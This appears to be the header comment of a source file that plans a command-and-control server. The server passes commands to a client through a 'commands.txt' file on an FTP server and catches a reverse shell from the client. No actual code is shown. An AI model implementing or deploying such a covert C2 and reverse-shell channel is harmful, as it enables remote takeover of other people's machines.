#This file shall implement the command and control server for the client
#it will connect to an FTP server and edit a file called "commands.txt". The client will read this file and execute the commands! 
#no other (direct) connection should be built up between client and server (only if strictly requested).
#The Server should also be able to recieve the reverse shell from the client, he does this by getting the clients ip from the sftp server and opening up a port for it.
